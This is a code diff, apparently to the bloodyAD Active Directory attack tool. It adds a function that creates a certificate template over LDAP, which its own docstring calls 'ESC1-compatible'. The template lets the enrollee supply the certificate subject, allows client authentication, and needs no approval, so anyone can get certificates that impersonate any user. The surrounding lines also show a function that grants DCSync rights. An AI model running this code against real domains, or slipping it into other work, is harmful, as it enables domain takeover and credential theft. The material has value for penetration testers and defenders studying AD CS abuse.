@@ -331,6 +331,59 @@ async def computer(conn: ConnectionHandler, hostname: str, newpass: str, ou: str
     LOG.info(f"{hostname}$ created")
 
 
+async def certificateTemplate(conn: ConnectionHandler, name: str, oid: str = None):
+    """
+    Create an ESC1-compatible object for an exact template name already published by a CA
+
+    :param name: Exact CN/name of the missing, already-published template
+    :param oid: Unique template OID (generated when omitted)
+    """
+    ldap = await conn.getLdap()
+    template_container = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{ldap.configNC}"
+    template_dn = f"CN={name},{template_container}"
+    if oid is None:
+        oid = "1.3.6.1.4.1.311.21.8." + ".".join(
+            str(random.SystemRandom().randint(100000, 999999)) for _ in range(4)
+        )
+
+    # badldap's read-side interval decoder cannot encode these two binary interval
+    # attributes. Override them for this process with the ordinary byte encoder.
+    from badldap.protocol import typeconversion
+
+    for interval_attribute in ("pKIExpirationPeriod", "pKIOverlapPeriod"):
+        typeconversion.MSLDAP_BUILTIN_ATTRIBUTE_TYPES_ENC[interval_attribute] = typeconversion.single_bytes
+        typeconversion._MSLDAP_BUILTIN_ATTRIBUTE_TYPES_ENC_LOWER[interval_attribute.lower()] = interval_attribute
+
+    attributes = {
+        "objectClass": ["top", "pKICertificateTemplate"],
+        "cn": name,
+        "displayName": name,
+        "flags": "66080",
+        "revision": "100",
+        "pKIDefaultKeySpec": "1",
+        "pKIKeyUsage": base64.b64decode("oAA="),
+        "pKIMaxIssuingDepth": "0",
+        "pKICriticalExtensions": "2.5.29.15",
+        "pKIExpirationPeriod": base64.b64decode("AEA5hy7h/v8="),
+        "pKIOverlapPeriod": base64.b64decode("AICmCv/e//8="),
+        "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"],
+        "pKIDefaultCSPs": [
+            "2,Microsoft Base Cryptographic Provider v1.0",
+            "1,Microsoft Enhanced Cryptographic Provider v1.0",
+        ],
+        "msPKI-RA-Signature": "0",
+        "msPKI-Enrollment-Flag": "0",
+        "msPKI-Private-Key-Flag": "16",
+        "msPKI-Certificate-Name-Flag": "1",
+        "msPKI-Minimal-Key-Size": "2048",
+        "msPKI-Template-Schema-Version": "1",
+        "msPKI-Template-Minor-Revision": "1",
+        "msPKI-Cert-Template-OID": oid,
+    }
+    await ldap.bloodyadd(template_dn, attributes=attributes)
+    LOG.info(f'Certificate template "{name}" created at "{template_dn}"')
+
+
 async def dcsync(conn: ConnectionHandler, trustee: str):
     """
     Add DCSync right on domain to provided trustee (Requires to own or to have WriteDacl on domain object)
